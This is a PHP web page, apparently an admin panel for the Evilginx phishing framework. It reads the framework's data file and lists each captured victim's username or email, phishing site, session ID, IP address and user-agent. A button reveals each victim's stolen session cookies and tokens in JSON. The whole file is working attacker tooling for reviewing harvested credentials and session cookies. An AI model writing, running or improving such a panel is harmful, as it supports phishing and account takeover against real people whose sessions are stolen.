<?php
// Path to your Evilginx cookie/db file
$dataFile = "/root/.evilginx/data.db";

// Check if file exists
if (!file_exists($dataFile)) {
    die("Data file not found.");
}

// Read the entire file
$lines = file($dataFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

// Parse JSON entries
$entries = [];
$temp = [];
foreach ($lines as $line) {
    $line = trim($line);
    if ($line === '') continue;

    // Detect JSON line
    if (strpos($line, '{') === 0 && strpos($line, '}') !== false) {
        $json = json_decode($line, true);
        if ($json) {
            $entries[] = $json;
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Evilginx Admin Panel</title>
    <style>
        body {
            font-family: monospace;
            background-color: #1e1e1e;
            color: #c5c8c6;
            padding: 20px;
        }
        h1 {
            text-align: center;
            color: #50fa7b;
        }
        .log-entry {
            border-bottom: 1px solid #444;
            padding: 15px 0;
            margin-bottom: 10px;
        }
        .json-block {
            white-space: pre-wrap;
            background-color: #2e2e2e;
            padding: 10px;
            border-radius: 5px;
            overflow-x: auto;
            margin-top: 5px;
        }
        .highlight {
            color: #8be9fd;
        }
        .btn {
            display: inline-block;
            padding: 5px 10px;
            margin-top: 5px;
            background-color: #6272a4;
            color: #f8f8f2;
            border-radius: 3px;
            cursor: pointer;
            text-decoration: none;
        }
        .btn:hover {
            background-color: #50fa7b;
            color: #1e1e1e;
        }
    </style>
    <script>
        function toggleCookie(id) {
            let elem = document.getElementById(id);
            if (elem.style.display === 'none') {
                elem.style.display = 'block';
            } else {
                elem.style.display = 'none';
            }
        }
    </script>
</head>
<body>
    <h1>Evilginx Admin Panel</h1>
    <?php if (count($entries) === 0): ?>
        <p>No logs or cookies found.</p>
    <?php else: ?>
        <?php foreach ($entries as $index => $entry): ?>
            <div class="log-entry">
                <strong>Visit #<?php echo $index + 1; ?></strong><br>
                <span class="highlight">Username / Email:</span> <?php echo htmlspecialchars($entry['username'] ?? 'N/A'); ?><br>
                <span class="highlight">Phishlet / Site:</span> <?php echo htmlspecialchars($entry['phishlet'] ?? 'N/A'); ?><br>
                <span class="highlight">Session ID:</span> <?php echo htmlspecialchars($entry['session_id'] ?? 'N/A'); ?><br>
                <span class="highlight">IP Address:</span> <?php echo htmlspecialchars($entry['remote_addr'] ?? 'N/A'); ?><br>
                <span class="highlight">User-Agent:</span> <?php echo htmlspecialchars($entry['useragent'] ?? 'N/A'); ?><br>
                <span class="highlight">Created:</span> <?php echo isset($entry['create_time']) ? date('Y-m-d H:i:s', $entry['create_time']) : 'N/A'; ?><br>
                <span class="highlight">Updated:</span> <?php echo isset($entry['update_time']) ? date('Y-m-d H:i:s', $entry['update_time']) : 'N/A'; ?><br>

                <?php if (isset($entry['tokens']) && is_array($entry['tokens'])): ?>
                    <a class="btn" onclick="toggleCookie('cookie-<?php echo $index; ?>')">View Cookies</a>
                    <div id="cookie-<?php echo $index; ?>" class="json-block" style="display:none;">
                        <?php echo htmlspecialchars(json_encode($entry['tokens'], JSON_PRETTY_PRINT)); ?>
                    </div>
                <?php endif; ?>
            </div>
        <?php endforeach; ?>
    <?php endif; ?>
</body>
</html>